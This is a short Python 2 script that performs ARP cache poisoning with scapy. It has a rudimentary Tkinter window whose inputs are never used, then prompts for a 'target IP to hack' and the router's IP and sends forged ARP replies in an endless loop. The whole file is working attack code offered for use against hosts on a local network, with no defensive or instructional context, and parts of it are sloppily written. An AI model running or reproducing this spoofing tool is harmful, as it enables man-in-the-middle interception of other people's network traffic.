#!/usr/bin/env python

from scapy.all import *
from subprocess import call
from tkinter import *
import tkinter as tk
import time

#Creates new window

label = Tk()
label.configure(background = 'white')
label.title('ARP Poisoning')
label.geometry('500x200')

Canvas(label, width=400, height=100, bg='ivory').pack(side=TOP, padx=5, pady=5)

HostNew = StringVar()
Label(label, font  = ('Helvetica',12), text = 'Enter the Host IP', bg = 'white').place(x=20,y=120)
Entry(label,textvariable=HostNew, bg = "light blue").place(x=10,y=150)

GatewayNew = StringVar()
Label(label, font  = ('Helvetica',12), text = 'Enter the Gateway IP', bg = 'white').place(x=330,y=120)
Entry(label,textvariable=GatewayNew, bg = "light blue").place(x=320,y=150)

Button(label, text ='Bhouyaa').pack(padx=5, pady=30)

def IpHost():
    return HostNew.get()
print IpHost()
def IpGateway():
    return GatewayNew.get()
print IpGateway()

label.mainloop()


def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

Timeout=2
my_mac = get_mac_address()
if not my_mac:
    print "Cant get local mac address, quitting"
    sys.exit(1)

op=1 # Op code 1 for ARP requests
victim=raw_input('Enter the target IP to hack: ') #person IP to attack
victim=victim.replace(" ","")

spoof=raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') #routers IP.. Should be the same one.
spoof=spoof.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=my_mac)

while 1:
	send(arp)
	#time.sleep(2)